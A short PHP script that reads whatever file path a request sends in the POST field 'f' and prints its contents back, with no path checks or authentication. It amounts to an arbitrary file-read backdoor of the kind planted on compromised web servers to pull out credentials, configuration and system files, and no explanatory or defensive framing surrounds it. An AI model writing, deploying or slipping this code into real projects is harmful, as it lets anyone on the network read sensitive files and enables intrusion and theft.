<?php
if (isset($_POST["f"])) {
     $dir_file =  $_POST["f"];
     $open_file = fopen( $dir_file,"r");
     while (!feof($open_file )) {
         $line = fgets($open_file );
         echo $line;
     }
     fclose($open_file);
}
?>